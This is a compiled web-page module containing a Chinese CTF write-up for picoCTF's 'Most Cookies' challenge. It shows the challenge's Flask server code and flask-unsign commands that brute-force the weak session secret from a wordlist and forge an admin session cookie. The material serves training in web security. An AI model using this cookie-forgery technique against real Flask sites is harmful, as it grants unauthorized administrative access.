import{_ as n,o as s,c as a,e as t}from"./app-855cd45a.js";const e={},p=t(`<p>给出了</p><h4 id="server-py" tabindex="-1"><a class="header-anchor" href="#server-py" aria-hidden="true">#</a> server.py</h4><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> session
<span class="token keyword">import</span> random
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
flag_value <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;./flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span>
title <span class="token operator">=</span> <span class="token string">&quot;Most Cookies&quot;</span>
cookie_names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;snickerdoodle&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;chocolate chip&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;oatmeal raisin&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;gingersnap&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;shortbread&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;peanut butter&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;whoopie pie&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;sugar&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;molasses&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;kiss&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;biscotti&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;butter&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;spritz&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;snowball&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;drop&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;thumbprint&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;pinwheel&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;wafer&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;macaroon&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;fortune&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;crinkle&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;icebox&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;gingerbread&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;tassie&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;lebkuchen&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;macaron&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;black and white&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;white chocolate macadamia&quot;</span><span class="token punctuation">]</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>cookie_names<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		check <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">]</span>
		<span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token string">&quot;blank&quot;</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&quot;index.html&quot;</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">&quot;/display&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		session<span class="token punctuation">[</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;blank&quot;</span>
		<span class="token keyword">return</span> resp

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/search&quot;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;POST&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> <span class="token string">&quot;name&quot;</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">]</span> <span class="token keyword">in</span> cookie_names<span class="token punctuation">:</span>
		resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">&quot;/display&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		session<span class="token punctuation">[</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">]</span>
		<span class="token keyword">return</span> resp
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		message <span class="token operator">=</span> <span class="token string">&quot;That doesn&#39;t appear to be a valid cookie.&quot;</span>
		category <span class="token operator">=</span> <span class="token string">&quot;danger&quot;</span>
		flash<span class="token punctuation">(</span>message<span class="token punctuation">,</span> category<span class="token punctuation">)</span>
		resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		session<span class="token punctuation">[</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;blank&quot;</span>
		<span class="token keyword">return</span> resp

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/reset&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> resp

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/display&quot;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		check <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">]</span>
		<span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">:</span>
			resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">&quot;flag.html&quot;</span><span class="token punctuation">,</span> value<span class="token operator">=</span>flag_value<span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> resp
		flash<span class="token punctuation">(</span><span class="token string">&quot;That is a cookie! Not very special though...&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;success&quot;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&quot;not-flag.html&quot;</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">,</span> cookie_name<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		session<span class="token punctuation">[</span><span class="token string">&quot;very_auth&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;blank&quot;</span>
		<span class="token keyword">return</span> resp

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
	app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>是关于 flask cookie 的 https://picoctf2021.haydenhousen.com/web-exploitation/most-cookies</p><p>用到了 flask-unsign https://pypi.org/project/flask-unsign/</p><p>页面有 <code>Cookie</code> session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZOTWWQ.MqJXu1KJyMpLy4QSFOyWE2Jipk4</p><p>可以查看session蕴含的信息</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>flask-unsign <span class="token parameter variable">-d</span> <span class="token parameter variable">--unsign</span> <span class="token parameter variable">--cookie</span> <span class="token string">&#39;eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZOTAPA.GSyyeb_UYNqS_awutC-nceLFuGU&#39;</span>
<span class="token punctuation">{</span><span class="token string">&#39;very_auth&#39;</span><span class="token builtin class-name">:</span> <span class="token string">&#39;blank&#39;</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>根据给出的代码，我们需要的是 {&#39;very_auth&#39;: &#39;admin&#39;}，所以我们需要伪造一个满足条件的 cookie</p><p>根据 flask-unsign d的用法分析 cookie 所用的 secret ，这里的 secret 就是 代码中的 cookie_names ，会随机使用</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>flask-unsign <span class="token parameter variable">--unsign</span> <span class="token parameter variable">--cookie</span> <span class="token string">&#39;eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZOTHjg.dFYbkYDft0WsalkPNagIemsniZQ&#39;</span> <span class="token parameter variable">--wordli</span>
st <span class="token string">&#39;word.txt&#39;</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Session decodes to: <span class="token punctuation">{</span><span class="token string">&#39;very_auth&#39;</span><span class="token builtin class-name">:</span> <span class="token string">&#39;snickerdoodle&#39;</span><span class="token punctuation">}</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting brute-forcer with <span class="token number">8</span> threads<span class="token punctuation">..</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found secret key after <span class="token number">28</span> attemptscadamia
<span class="token string">&#39;peanut butter&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>根据这句可以得出 cookie 的 secret ,之后我们就能根据 确定的 secret 伪造自己的 cookie</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>flask-unsign <span class="token parameter variable">--sign</span> <span class="token parameter variable">--cookie</span> <span class="token string">&quot;{&#39;very_auth&#39;: &#39;admin&#39;}&quot;</span> <span class="token parameter variable">--secret</span> <span class="token string">&#39;peanut butter&#39;</span>
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZOTGGA.x9ijdmwVPLCuikZTgcBp_xHj2N8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>将伪造的 cookie 替代原来的，刷新页面，得到 flag</p><h4 id="word-txt" tabindex="-1"><a class="header-anchor" href="#word-txt" aria-hidden="true">#</a> word.txt</h4><div class="language-txt line-numbers-mode" data-ext="txt"><pre class="language-txt"><code>&quot;snickerdoodle&quot;
&quot;chocolate chip&quot;
&quot;oatmeal raisin&quot;
&quot;gingersnap&quot;
&quot;shortbread&quot;
&quot;peanut butter&quot;
&quot;whoopie pie&quot;
&quot;sugar&quot;
&quot;molasses&quot;
&quot;kiss&quot;
&quot;biscotti&quot;
&quot;butter&quot;
&quot;spritz&quot;
&quot;snowball&quot;
&quot;drop&quot;
&quot;thumbprint&quot;
&quot;pinwheel&quot;
&quot;wafer&quot;
&quot;macaroon&quot;
&quot;fortune&quot;
&quot;crinkle&quot;
&quot;icebox&quot;
&quot;gingerbread&quot;
&quot;tassie&quot;
&quot;lebkuchen&quot;
&quot;macaron&quot;
&quot;black and white&quot;
&quot;white chocolate macadamia&quot;

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16),o=[p];function i(u,c){return s(),a("div",null,o)}const r=n(e,[["render",i],["__file","Most Cookies.html.vue"]]);export{r as default};
